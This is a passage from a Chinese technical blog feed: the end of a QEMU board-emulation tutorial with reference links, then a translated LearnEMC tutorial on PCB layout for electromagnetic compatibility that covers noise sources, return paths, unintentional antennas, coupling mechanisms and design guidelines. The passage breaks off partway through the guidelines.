id="使用-QEMU-直接模拟一块开发板"><a href="#使用-QEMU-直接模拟一块开发板" class="headerlink" title="使用 QEMU 直接模拟一块开发板"></a>使用 QEMU 直接模拟一块开发板</h1><p>在上面的过程中，我们使用 QEMU 模拟了一块系统自带的开发板。但是 QEMU 的功能还远远不止如此。下面我们使用 QEMU 直接模拟一块开发板。使用 QEMU 来直接定制一块自己的开发板。</p><h2 id="QEMU-编程基础"><a href="#QEMU-编程基础" class="headerlink" title="QEMU 编程基础"></a>QEMU 编程基础</h2><p>QEMU是一款开源的模拟器及虚拟机监管器(Virtual Machine Monitor, VMM)，通过动态二进制翻译来模拟CPU，并提供一系列的硬件模型，使guest os认为自己和硬件直接打交道，其实是同QEMU模拟出来的硬件打交道，QEMU再将这些指令翻译给真正硬件进行操作。</p><h3 id="QOM-机制"><a href="#QOM-机制" class="headerlink" title="QOM 机制"></a>QOM 机制</h3><p>QOM——The QEMU Object Model</p><p>QEMU提供了一套面向对象编程的模型——QOM，即QEMU Object Module，几乎所有的设备如CPU、内存、总线等都是利用这一面向对象的模型来实现的。</p><p>QEMU对象模型提供了一个注册用户可创建类型并从这些类型实例化对象的框架。<br>其实也就是一种OOP IN C(C上实现面对对象)。一段面对对象的程序代码（C++语言）</p><h2 id="准备好启动脚本——boot-scr"><a href="#准备好启动脚本——boot-scr" class="headerlink" title="准备好启动脚本——boot.scr"></a>准备好启动脚本——boot.scr</h2><h2 id="准备好启动参数——cmdline-txt"><a href="#准备好启动参数——cmdline-txt" class="headerlink" title="准备好启动参数——cmdline.txt"></a>准备好启动参数——cmdline.txt</h2><h2 id="准备好镜像文件——Image"><a href="#准备好镜像文件——Image" class="headerlink" title="准备好镜像文件——Image"></a>准备好镜像文件——Image</h2><h2 id="准备好启动设备——sdcard-img"><a href="#准备好启动设备——sdcard-img" class="headerlink" title="准备好启动设备——sdcard.img"></a>准备好启动设备——sdcard.img</h2><h2 id="准备好启动命令——qemu-system-arm"><a href="#准备好启动命令——qemu-system-arm" class="headerlink" title="准备好启动命令——qemu-system-arm"></a>准备好启动命令——qemu-system-arm</h2><h2 id="启动模拟器"><a href="#启动模拟器" class="headerlink" title="启动模拟器"></a>启动模拟器</h2><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzAwMjQ1ODYyOQ==&chksm=9acb5473adbcdd656771483ef000e08d3bfb9f761c7f6c036cbbaae28c590593abab5f89e71f&idx=1&mid=2247483673&mpshare=1&scene=21&sharer_shareid=025223779ea46de7b8ccafe0bbfa3cc1&sharer_sharetime=1573647854905&sn=2df104549a462b36d46c828ca88e98e5&srcid=#wechat_redirect">一次搞定 Arm Linux 交叉编译</a></li><li><a href="https://www.linmao.dev/joy/659/#%E5%88%B6%E4%BD%9C%E6%A0%B9%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%95%9C%E5%83%8F">用qemu模拟器搭建arm运行环境</a></li><li><a href="https://blog.csdn.net/leacock1991/article/details/113735396">从0开始使用QEMU模拟ARM开发环境系列一览表</a></li><li><a href="https://blog.csdn.net/leacock1991/article/details/113704225">从0开始使用QEMU模拟ARM开发环境</a></li><li><a href="https://www.zhaixue.cc/qemu/qemu-intro.html">宅学部落——QEMU模拟器使用指南</a></li><li><a href="https://blog.csdn.net/weixin_45090728/article/details/124355432">Qemu使用及常见开发板的模拟</a></li><li><a href="https://mshrimp.github.io/2019/08/18/Qemu%E6%90%AD%E5%BB%BAARM-vexpress%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83(%E4%BA%8C)----u-boot%E5%90%AF%E5%8A%A8kernel/">Qemu搭建ARM vexpress开发环境(二)</a></li><li><a href="https://www.jianshu.com/p/94833e841742">Qemu搭建ARM vexpress开发环境(一)</a></li><li><a href="https://www.jianshu.com/p/8619a6739040">Qemu搭建ARM vexpress开发环境(二)</a></li><li><a href="https://www.jianshu.com/p/cf46f7225db6">Qemu搭建ARM vexpress开发环境(三)</a></li><li><a href="https://blog.csdn.net/aggresss/article/details/74834155">虚拟机就是开发板</a></li><li><a href="https://blog.csdn.net/nature_07/article/details/128607903">qemu使用uboot通过网络加载 linux kernel</a></li></ul><h1 id="参考资料——自定义开发板"><a href="#参考资料——自定义开发板" class="headerlink" title="参考资料——自定义开发板"></a>参考资料——自定义开发板</h1><ul><li><a href="https://quard-star-tutorial.readthedocs.io/zh-cn/latest/ch3.html">QEMU 自定义 RISCV 开发板</a></li><li><a href="https://github.com/QQxiaoming/quard_star_tutorial">QEMU 自定义 RISCV 开发板 Github链接</a></li><li><a href="https://blog.csdn.net/DreamTrue520/article/details/135703895">在WIN从零开始在QMUE上添加一块自己的开发板(一）</a></li><li><a href="https://blog.csdn.net/DreamTrue520/article/details/135714894?spm=1001.2014.3001.5502">在WIN从零开始在QMUE上添加一块自己的开发板（二）</a></li><li><a href="https://www.giantbranch.cn/2020/01/05/QEMU%20%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8AQOM%28Qemu%20Object%20Model%29%E7%9A%84%E9%83%A8%E5%88%86%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/">QEMU原理</a></li><li><a href="https://yanglianoo.github.io/2023/06/14/QEMU%E4%B8%AD%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BC%80%E5%8F%91%E6%9D%BF2-virt%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">QEMU 源码分析</a></li><li><a href="https://arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/#0x00-%E4%B8%80%E5%88%87%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D">QEMU使用指南</a></li><li><a href="https://www.qemu.org/docs/master/devel/qom.html">QEMU 编程官方教程</a></li><li><a href="https://www.micoder.cc/blog/2337.html">QEMU官方翻译资料(来自archwiki)</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PCB设计中EMC问题</title>
    <link href="/2024/05/05/PCB%E8%AE%BE%E8%AE%A1%E4%B8%AD%E7%9A%84EMC%E9%97%AE%E9%A2%98/"/>
    <url>/2024/05/05/PCB%E8%AE%BE%E8%AE%A1%E4%B8%AD%E7%9A%84EMC%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>PCB设计中EMC问题</p><span id="more"></span><p>本篇教程参考自克莱门森大学Todd Hubing博士和Nancy Hubing博士的网站LearnEMC.com</p><p>本教程仅供学习参考使用，所有权利归属LearnEMC.com网站。原文链接<a href="https://learnemc.com/pcb-layout">PCB Layout – LearnEMC</a></p><p>一些电路设计是在微小硅晶片上制造的，其他电路设计由通过电缆连接的各种组件组成。然而，电子兼容性工程师的注意重点一直是印刷在玻璃纤维环氧树脂上的印刷电路PCB。下图所示的印刷电路版PCB可以在几乎所有的电子系统中找到：带金属引脚的电路元件由铜质导线连接，表面装贴器件（SMT）贴装在电路板的顶部或底部，通孔元件（TH）通过穿过电路板的引脚焊接在板上。<img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405062154975.png"></p><p>多层板通常具有实心铜平面的整个层以将功率分配给板上的元件。 这些平面通常以它们连接的元件引脚命名。 例如，将所有元件的VCC引脚连接到电源的铜平面通常称为VCC平面。</p><p>PCB上元件的放置和走线路径通常在确定采用PCB的产品的电磁兼容性方面起关键作用。 良好布局的电路板将不会放出大量辐射，并且尽量减少可能将噪声与电缆或其他物体耦合在一起的电流和场。良好布局的电路板也可以将外部电流或场将干扰信号耦合到电路板上的机会降到最低。</p><p>大多数电路板设计师都采用了一系列设计指南来帮助放置组件和路线。 例如，典型的设计指南可能是“最小化携带数字时钟信号的所有走线的长度”。通常，电路板设计师并不理解这些设计指南的背后原因，或是并不了解违反这些设计指南而可能造成的后果。</p><p><em><strong>小测验</strong></em></p><p><em>假设您正在给一个高速多层PCB布局，并且您需要将携带高频信号的导线从数字器件连接到模拟放大器。 您希望尽可能减少电磁兼容性（EMC）问题的机会，因此您可以在网络上搜索EMC设计指南，并找到与您的情况有关的三个设计指南：</em></p><p><em>1.最小化高速走线的长度;</em><br><em>2.总是在模拟和数字电路之间留下间隙;</em> <br><em>3.不要让高速走线跨过信号间隙。</em></p><p>_基于以上的三个设计指南，有如下图所示的三种设计方案。方案a直接连接了数字电路和模拟电路，但因此模拟电路和数字电路之间没有阻隔间隙：方案b用间隙阻隔了模拟电路和数字电路，但高速走线的长度增加了许多：方案c在模拟和数字电路之间留下了分隔的间隙而且高速走线的长度很短，可因此高速走线跨过了分隔间隙。哪种设计方案才是最好的呢？或者，是否因为三种设计都违反了某一条设计指南，所以这三种设计方案都不是好方案？</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405062155223.png"></p><p><em>这些是电路板设计们每天都要面临的问题。 做出正确选择可以让电路板的电磁兼容性通过EMC测试，反之则会产生严重的电磁兼容性问题。 在本题中，其中一个选择比其他两个更好。 然而，在我们揭示正确的答案之前，让我们制定一个评估印刷电路板布局的策略。 通过适当的策略，这个测验问题的正确答案应该是显而易见的。本题答案在文章最后揭晓。</em></p><p>在本教程中，我们将探讨每个EMC工程师在布置印刷电路板或查看现有电路板设计时应采用的四个步骤。 这些步骤是：</p><ul><li><strong>识别潜在的EMI来源和受害者</strong></li><li><strong>识别重要的电流路径</strong></li><li><strong>识别潜在的天线部件</strong></li><li><strong>探索可能的耦合机制</strong></li></ul><p>通过以上四步的分析，PCB元器件的布局和导线的走线将会十分清晰。我们将了解，在特定的电路中，哪些设计指南更重要，哪些设计指南不太重要。</p><h2 id="识别潜在的EMI来源和受害者"><a href="#识别潜在的EMI来源和受害者" class="headerlink" title="识别潜在的EMI来源和受害者"></a>识别潜在的EMI来源和受害者</h2><p>典型的电路板可能有几十个，几百个甚至数千个电路。 每个电路是可能最终无意地耦合到其他电路或器件的潜在的能量源。 每个电路也是无意耦合噪声的潜在受害者。 然而，一些电路比其他电路更可能成为噪声源，而其他电路更有可能成为受害者。 EMC工程师和电路板设计师应该能够识别那些潜在的良好来源和潜在最易受影响的电路。 下面讨论特别感兴趣的电路。</p><h3 id="数字时钟电路"><a href="#数字时钟电路" class="headerlink" title="数字时钟电路"></a>数字时钟电路</h3><p>同步数字电路使用系统时钟把时钟信号发送到电路板上每个需要时钟信号的有源器件上。 时钟信号不断切换并具有窄带谐波。 它们通常是印刷电路板上最有活力的信号之一。 因此，在时钟频率的谐波处看到窄带辐射发射峰值并不罕见。下图是一个含有25MHz时钟的发射频谱。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405062156528.png"></p><p>在该图中，辐射发射明显地由25MHz时钟的谐波支配。 200 – 1000 MHz的噪声基准是用于进行测量的频谱分析仪的热噪声（经过校正以反映天线因子）。 为了使本产品符合FCC或CISPR B类辐射发射规范，时钟源振幅必须降低以使无意的“天线”效率较低，或源-天线耦合路径衰减。</p><h3 id="数字信号"><a href="#数字信号" class="headerlink" title="数字信号"></a>数字信号</h3><p>数字印刷电路板上的大多数导线都携带数字信息而不是时钟信号。 数字信号不像时钟信号一样周期，而且它们的随机性质会导致更宽带的噪声。 数字信号更频繁地切换可导致类似于时钟信号的辐射。 比如，微处理器地址总线中的最低有效位，因为连续的地址可能会导致该信号在时钟频率上切换。 来自数字信号的辐射的确切形式和强度取决于许多因素，包括软件运行和采用的编码方案。 一般来说，数据信号比时钟信号要麻烦得多; 然而高速数据仍然会产生大量的噪音。</p><h3 id="电源开关电路"><a href="#电源开关电路" class="headerlink" title="电源开关电路"></a>电源开关电路</h3><p>开关模式电源和DC-DC转换器通过快速切换电流进入变压器来产生不同的电压。典型的开关频率在10 – 100 kHz范围内。由此开关产生的电流的尖峰可以将噪声耦合到电源输出和电路板上的其他设备。虽然该噪声信号是相对周期性的（即，窄带谐波），但是由于谐波频率之间的距离低于测量的分辨率带宽，所以在辐射发射测试期间它看起来是宽带噪声。</p><p>上图中120MHz处的噪声的小驼峰是由于电源开关噪声引起的。 在本产品中，相对于时钟噪声，开关噪声可忽略不计。 然而，在其他产品中，功率开关噪声可以占主导地位，因为只有开关噪声的高次谐波落在辐射发射测量的频率范围内。 我们可以通过减慢开关电路的转换时间来降低功率开关噪声。 然而，这降低了电源的效率，所以最好采用其他的替代方法。</p><h3 id="模拟信号"><a href="#模拟信号" class="headerlink" title="模拟信号"></a>模拟信号</h3><p>模拟信号既可以是宽带也可以是窄带，既可以在高频也可以在低频。 如果电路板上采用的是模拟信号，那么就需要我们熟悉这些信号在时域和频域上特性。 窄带，高频模拟信号可能特别难。但幸运的是，由于模拟信号对低电平的噪声更敏感，所以通常可以用最小化辐射发射的方式布局来解决信号完整性的问题。</p><h3 id="直流电源导线和低速数字信号"><a href="#直流电源导线和低速数字信号" class="headerlink" title="直流电源导线和低速数字信号"></a>直流电源导线和低速数字信号</h3><p>一般来说，直流电源和低速数字信号在辐射发射频率上的功率不足以造成麻烦。 然而，这些导线往往是最难发现的EMC问题。 这是因为这些导线上的无意的高频电压和电流有时会高于高速信号导线上的电压和电流。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405062156977.png"></p><p>上图展示了在个人计算机中常用的动态随机存取存储器模块上的近磁场的映射。 近磁场反映了元件封装内的电流的流动。 测量频率是时钟频率的三次谐波。 请注意，从直流电源引脚抽出的电流大于从信号引脚拉出的电流。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405062156679.png"></p><p>上图展示了用现场可编程门阵列（FPGA）中实现的微处理器上的近磁场的类似图像。在该图中，我们看到注入到一些低速地址线上的电流几乎与时钟信号中的电流一样强。</p><p>高频电流和电压怎样才会在低频数据线上出现？出现的原因大多数都与连接到这些导线的集成电路（IC）的设计和布局有关。一些IC做的很好，内部产生的噪音处理得很好，而有些IC则不然。不良IC设计可能会在与IC连接的每个输入和输出导线上产生高频电压波动。好的IC设计则不会如此。</p><p>当布局具有高频内部时钟而又并不熟悉IC内部特性的PCB时，最好将该IC上的每个引脚都像它是与内部时钟相同特性的高频源一样对待。否则，电源或低速数字走线可能是辐射发射最重要的来源。</p><h2 id="识别电流回路"><a href="#识别电流回路" class="headerlink" title="识别电流回路"></a>识别电流回路</h2><p>数字电路工程师和EMC工程师的最大区别可能就在于EMC工程师会把电路里的电流流向跟电路电压看得同样重要。这是非常重要的一点。许多不良设计就是忽视了信号电流流向的直接结果。</p><p>下面回顾两个电路设计的主要概念。首先也是最重要的一点：</p><p><strong>1. 电流总是形成一个回路</strong></p><p><strong>2. 电流总是沿着最小阻抗的路径流动</strong></p><p>在低频段（kHz或更低），阻抗大小由电阻值决定。所以电流路径沿着最小阻值流动。在高频段（MHz或更高），阻抗大小由电感值决定，所以电流路径沿着最小电感流动。</p><p>考虑下图所示的电路板布局。50MHz的信号在平面上连接元件A跟元件B的的导线上传播。我们知道等量的电流必须从元件B流向元件A。在这种情况下，我们假设这个电流由元件B的GND脚流出，流到元件A的GND脚。 由于这两个元件的GND脚彼此接近而且中间由铜层填充，所以我们很有认为：电流在它们之间采用最短的路径流动（如PATH1所示）。 但是现在我们知道这是不正确的。 高频情况下电流采用最小电感或最小环路径的路径。 因此，在平面上返回的大部分信号电流直接沿信号导线下方的窄路径（PATH2）中流动。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405062159601.png"></p><p>如果电路板上的某个层处于某种原因被隔断了，如下图所示，隔断2几乎不会给信号完整性和辐射发射产生影响，而隔断1可能会导致严重的问题。导线下层上的返回电流不得不沿着隔断边沿流动，这样会大幅增加信号闭环的区域。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405062159213.png"></p><p>在低频波段（通常是kHz或者更低），电路板层的电阻倾向于扩散电流，以使得两个相距较远的点之间的电流可以覆盖大部分的电路板，如下图所示。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405062159461.png"></p><p>在有低频模拟元件跟数字元件的混合信号板上电流这样传播就会出现问题。下图中，在Ground层正确放置隔断可以保护特定区域的电路不受低频返回电流的影响。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405062159366.png"></p><h2 id="识别天线"><a href="#识别天线" class="headerlink" title="识别天线"></a>识别天线</h2><p>EMC工程师遇到的大多数造成有效辐射天线往往是无心造成的。这类天线通常满足三个条件：</p><ol><li>天线必须由两部分组成</li><li>这两部分在电气上不能视为『小』</li><li>这两部分之间必须形成电压差</li></ol><p>大多数印刷电路板在低于约100 MHz（λ&gt; 3米）的频率下电气上『较小』。 这意味着任何有效的天线部件必须相对于电路板上的大多数板元件要更大。 通常，在低频下，唯一可行的天线部件是连接的电缆和&#x2F;或金属底盘。 如果以最小化在这些可能的天线部分中的任何两个之间引起电压的可能性的方式来布局PCB，则不太可能导致辐射发射或辐射敏感性问题。</p><p>下图展示了两种PCB布局。连接器和外壳连接是可能的有效天线部件。第二种布局在100MHz频率以下产生辐射耦合问题的可能性更低，因为它不太可能在能够用作有效天线的任何两个导体之间产生显着的电压差。可以看到，仅仅通过把两个连接器放在了电路板的同一侧，我们就解决了一个潜在的EMC问题。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405062156303.png"></p><p>100MHz以上频率的电磁波波长较短，安装在电路板（或电路板本身）上的物体更可能成为有效的天线部件。然而，即使在高达几GHz的频率下，这些天线部件也应该相对容易发现。例如，在1GHz，自由空间中的波长为30cm。四分之一波长为7.5厘米。因此，有效的天线部分将必须至少几厘米长，并且被相当大小或者更大的东西驱动。回想起差分电流（返回路径在附近的电流）是相对低效的辐射源，这意味着位于其当前返回路径旁边或上方的导线不是良好的天线部件。所以如果我们的天线的一半是板上的金属平面，另一半必须竖起并且远离平面。这有助于使这些天线部件即使在相对较高的频率下也能够容易地识别。下表列出了高于和低于100 MHz的PCB上发现的常见天线部件。</p><table><tbody><tr><td colspan="2"><p><strong><span>优良天线部件</span></strong></p></td><td colspan="2"><p><strong><span>不良天线部件</span></strong></p></td></tr><tr><td><p><span>&lt; 100 MHz</span></p></td><td><p><span>&gt; 100 MHz</span></p></td><td><p><span>&lt; 100 MHz</span></p></td><td><p><span><span>&gt; 100 MHz</span></span></p></td></tr><tr><td><p><span>线缆</span></p></td><td><p><span>散热片</span></p></td><td></td><td></td></tr><tr><td></td><td>电源平面（覆铜区域）</td><td><p><span>微波传输带和带状导线</span></p></td><td><span>微波传输带和带状导线</span></td></tr><tr><td></td><td>体积高的元件</td><td><p><span>个头不大的任何部件</span></p></td><td></td></tr><tr><td></td><td><p><span>外壳接缝</span></p></td><td></td><td></td></tr></tbody></table><h2 id="识别耦合机制"><a href="#识别耦合机制" class="headerlink" title="识别耦合机制"></a>识别耦合机制</h2><p>当我们识别出电路板上潜在的辐射源&#x2F;受害设备以及潜在的天线以后，使两者之间的耦合最小的设计就是一个好的电路板设计。电磁耦合只有以下四类：</p><ul><li>传导耦合</li><li>电场耦合</li><li>磁场耦合</li><li>辐射耦合</li></ul><p>本篇教程讨论的是在同一块板子上的源和天线之间的耦合，所以辐射耦合不作讨论。这样我们只需要考虑前三种耦合机制。传导耦合在只有当我们已经识别出辐射源驱动了靠近它的优良天线时才会发生。传导耦合的一个例子是，信号导线的长度可被视为一个被驱动的有效天线部件，而这个信号导线没有在返回信号层走线。这种情况下，辐射源是信号源，而天线则是『导线-平面（覆铜区域）』对。 显然，直接驱动到导线或其他导体上的高频信号需要在附近的其他导体上返回到其源极，以避免由于源和天线之间的直接传导耦合引起的辐射发射。</p><p>一旦辐射源和天线部件被识别出来后，传导耦合就容易被发现了。 然而，场耦合机制往往不那么明显。 为了使场耦合更直观，我们可以将电场耦合视为与源极电压（电压驱动）成比例的耦合，将磁场耦合视为与源极电流（电流驱动）成比例的耦合。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405062200304.png"></p><h3 id="电压驱动耦合"><a href="#电压驱动耦合" class="headerlink" title="电压驱动耦合"></a>电压驱动耦合</h3><p>上图a就是一个电压驱动耦合导致辐射发射的例子。上图a中，信号导线在散热片的正下方。如果散热片在电气上不小的话，它就是一个潜在的有效天线部件。电路板的金属层是另外一个潜在的有效天线部件。信号导线并不直接连接散热片，所以不存在传导耦合的路径。然而如图b所示，导线和电路板之间的电场线被散热片截获，导线上的电压可以驱动相对于电路板的散热片。该电场耦合可以用图c中的电容表示。相对于电路板的散热片上的感生电压可由下式表示：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405062200350.png"></p><p>通常，电路板设计师会避免在体积较大的散热片下方布置高速信号导线。电场耦合更常见的例子如下图所示。一个主动元件像三明治一样被夹在PCB和散热片中间。同样的，在我们感兴趣的频率范围内，电路板和散热片的体积都不算小。由于元件通过有限电感连接引出高频电流，所以元件的平均电压不等于电路板上的电压，如图a所示。这个电压驱动了元件相对于电路板的表面，如图b中的模型所示。在散热片和电源之间没有直接的连接，所以我们不可能发生传导耦合。然而，在元件表面和散热片直接的电容提供了一个非直接的电场连接。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405062200468.png"></p><p>请注意，在上述情况中，驱动产生电压的是电感中的电流。 换句话说，耦合过程中存在磁场。 然而，将元件耦合到天线的场是电场，并且辐射发射与元件相对于电路板的电压成比例。 因此，我们还将此称为电压驱动耦合。</p><h3 id="电流驱动耦合"><a href="#电流驱动耦合" class="headerlink" title="电流驱动耦合"></a>电流驱动耦合</h3><p>当源和天线之间的耦合是由于磁场而与信号电流成比例时，这种耦合被称为电流驱动耦合。电路设计师经常考虑电压方面的信号，因此不太可能无意中用信号电压去驱动良好的天线。然而，如果他们忽视考虑电流的流向，那么他们的设计很有可能导致磁场驱动两个具有磁场的良好的天线部件。</p><p>下图展示了电流驱动耦合的一个非常常见的例子。设计良好的电路板的两侧都有连接器。我们现在假设电缆是完全屏蔽的，电缆屏蔽层连接到电路板上的GND层。微带导线由在板子的一端被驱动，结束于板子的另一端。电路板上电路在两个连接器中间。</p><p>我们已经知道，微带导线不是有效的辐射源，所以这个设计中唯一可能的天线部分是两个屏蔽电缆，它们都是“接地的”。我们期望两个天线部分处于相同的电位，因为它们以大面积的平面（覆铜区域）相互连接。但是，请记住，对于“接地”导体来说，一个重要的要求就是它不会传递有意的电源或信号电流。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405062200481.png"></p><p>如图b所示，该设计中的“接地”平面（覆铜区域）确实带有信号电流。事实上，在接地层中流动的电流产生了绕平面（覆铜区域）的磁通量。如果我们将两条电缆视为天线的一部分，并通过天线阻抗来表示天线电流路径，如图c所示，显而易见的是，流过微带导线电路的电流会在驱动的平面上引起一根电缆相对另一根电缆的电压。</p><p>虽然在平面上感应的电压通常比信号电压低几个数量级，但高效天线上的几毫伏噪声足以超过FCC和CISPR的辐射发射要求。实际上，当高速数字元件位于非屏蔽产品中的板上的连接器之间时，很难满足辐射发射要求。另一方面，当两个连接器彼此相邻时，磁场不可能在它们之间感生出足够的电压来引起电磁兼容性问题。</p><h3 id="对I-O的直接耦合"><a href="#对I-O的直接耦合" class="headerlink" title="对I&#x2F;O的直接耦合"></a>对I&#x2F;O的直接耦合</h3><p>尽管严格来说这并不是一个独立的耦合机制。但PCB布局中常见的问题就是将噪声源直接耦合到了能在电路板上传播噪声信号的导线上。下图就是一个例子。一条普通的高速导线沿着连接到连接器上的另外一条导线走线。从一条导线到另外一条导线耦合的电流和&#x2F;或电压可以沿着I&#x2F;O导线传播并离开电路板。图中所示的例子中，两个天线部件既可以是相对于电路板被驱动的I&#x2F;O线缆也可以是相对于另外一条I&#x2F;O线缆被驱动的I&#x2F;O线缆。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405062201259.png"></p><p>你可能认为这种EMC问题很难出现，因为你一眼就看出了这个设计问题。然而在利用自动布线器布线了成百上千条导线的电路板上，这种情况常常发生。如果你使用的自动布线器无法检查在高速导线附近走线的I&#x2F;O走线，那你就应该采用手动布线以避免这种EMC问题。同样的道理也适用于在输入端附近的I&#x2F;O导线，因为电路板上最容易受到辐射噪声的方式就是通过I&#x2F;O的直接耦合。</p><h2 id="PCB设计指南"><a href="#PCB设计指南" class="headerlink" title="PCB设计指南"></a>PCB设计指南</h2><p>如前所述，许多电路板设计师都采用了一系列指导原则来帮助放置元件和走线。在我们了解了印刷电路板上的噪声源，天线和耦合机制的相关知识后，我们可以更仔细地探究这些设计指南中，了解它们背后的原因以及在不同情况下它们的重要性。以下是PCB的16个EMC设计指南，以及每个指南的简短解释说明。</p><h5 id="1-高速信号或时钟信号导线的走线越短越好"><a href="#1-高速信号或时钟信号导线的走线越短越好" class="headerlink" title="1.高速信号或时钟信号导线的走线越短越好"></a>1.高速信号或时钟信号导线的走线越短越好</h5><p>高速数字信号和时钟通常是最强的噪声源。 导线越长，发生耦合的机会越大。 还要记住，循环面积通常比导线的长度更重要。 确保在每个导线附近都有一个很好的高频电流返回路径。</p><h5 id="2-直连到连接器的导线（即I-O导线）的走线越短越好"><a href="#2-直连到连接器的导线（即I-O导线）的走线越短越好" class="headerlink" title="2.直连到连接器的导线（即I&#x2F;O导线）的走线越短越好"></a>2.直连到连接器的导线（即I&#x2F;O导线）的走线越短越好</h5><p>直连到连接器的导线可能是能量到板上或板外的耦合路径。</p><h5 id="3-高频信号导线不应当在电路板的I-O元件下方走线"><a href="#3-高频信号导线不应当在电路板的I-O元件下方走线" class="headerlink" title="3.高频信号导线不应当在电路板的I&#x2F;O元件下方走线"></a>3.高频信号导线不应当在电路板的I&#x2F;O元件下方走线</h5><p>在元件下布线的导线可以电容性地或电感性地将能量耦合到该元件。</p><h5 id="4-所有连接器应当位于电路板的同一边或同一角上"><a href="#4-所有连接器应当位于电路板的同一边或同一角上" class="headerlink" title="4.所有连接器应当位于电路板的同一边或同一角上"></a>4.所有连接器应当位于电路板的同一边或同一角上</h5><p>连接器是大部分设计中最有效的天线部件。把它们置于电路板的同一侧，可以尽可能地减少驱动一个连接器相对于另一个连接器的共模电压。</p><h5 id="5-I-O连接器之间不应当布局高速电路"><a href="#5-I-O连接器之间不应当布局高速电路" class="headerlink" title="5.I&#x2F;O连接器之间不应当布局高速电路"></a>5.I&#x2F;O连接器之间不应当布局高速电路</h5><p>即使两个连接器位于电路板的相同边缘，位于它们之间的高速电路也可以产生足够的共模电压来驱动一个连接器相对于另一个连接器，导致显著的辐射发射。</p><h5 id="6-重要的信号导线和时钟导线要埋在Power-Ground层之间"><a href="#6-重要的信号导线和时钟导线要埋在Power-Ground层之间" class="headerlink" title="6.重要的信号导线和时钟导线要埋在Power&#x2F;Ground层之间"></a>6.重要的信号导线和时钟导线要埋在Power&#x2F;Ground层之间</h5><p>把导线布线在两个实体平面（覆铜区域）之间可以有效防止导线发生有害耦合。</p><h5 id="7-选择具有最大可接受片外转换时间（-acceptable-off-chip-transition-times-）的主动数字元件"><a href="#7-选择具有最大可接受片外转换时间（-acceptable-off-chip-transition-times-）的主动数字元件" class="headerlink" title="7.选择具有最大可接受片外转换时间（_acceptable off-chip transition times_）的主动数字元件"></a>7.选择具有最大可接受片外转换时间（_acceptable off-chip transition times_）的主动数字元件</h5><p>如果数字波形的转换时间比所需要的时间快，则它产生的高次谐波的功率可能要高得多。 如果使用的逻辑的转换时间比它们需要的更快，它们通常可以使用串联电阻器或铁氧体来降低转换时间。</p><h5 id="8-来自单个设备的所有板外信号应该通过同一个连接器连接到PCB"><a href="#8-来自单个设备的所有板外信号应该通过同一个连接器连接到PCB" class="headerlink" title="8.来自单个设备的所有板外信号应该通过同一个连接器连接到PCB"></a>8.来自单个设备的所有板外信号应该通过同一个连接器连接到PCB</h5><p>许多元件（特别是大型超大规模集成电路设备）在不同I &#x2F; O引脚之间产生大量的共模噪声。 如果这些设备中的一个连接到多个连接器，则这种共模噪声将潜在地驱动良好的天线。 （该设备也将更容易受到在这个天线上带来的辐射噪声的影响。）</p><h5 id="9-高速（或易感）导线应该至少距电路板边缘2X走线，其中X是导线和它返回电流路径之间的距离"><a href="#9-高速（或易感）导线应该至少距电路板边缘2X走线，其中X是导线和它返回电流路径之间的距离" class="headerlink" title="9.高速（或易感）导线应该至少距电路板边缘2X走线，其中X是导线和它返回电流路径之间的距离"></a>9.高速（或易感）导线应该至少距电路板边缘2X走线，其中X是导线和它返回电流路径之间的距离</h5><p>靠近电路板边缘的导线产生的磁场和电场更不容易被包含。来自和发往天线的串话和耦合往往更大。</p><h5 id="10-差分信号导线对应当布线在一起，并始终保持相同距离"><a href="#10-差分信号导线对应当布线在一起，并始终保持相同距离" class="headerlink" title="10.差分信号导线对应当布线在一起，并始终保持相同距离"></a>10.差分信号导线对应当布线在一起，并始终保持相同距离</h5><p>当差分信号对保持平衡时，它们更不易受噪声干扰，也不易产生辐射发射。</p><h5 id="11-所有相对于同一个返回电源层（如GND层）的电源层（如电压层）应当在同一层布线"><a href="#11-所有相对于同一个返回电源层（如GND层）的电源层（如电压层）应当在同一层布线" class="headerlink" title="11.所有相对于同一个返回电源层（如GND层）的电源层（如电压层）应当在同一层布线"></a>11.所有相对于同一个返回电源层（如GND层）的电源层（如电压层）应当在同一层布线</h5><p>例如，当一个电路板采用3.3V，3.3V模拟和1V的三种电源，那我们一定希望减少这三层之间的高频耦合。把这三个平面放在同一层将确保它们彼此不会重叠。因为有源器件不太可能在板上任何一个位置需要两个不同的电压，这样也可以提高布局的高效性。</p><h5 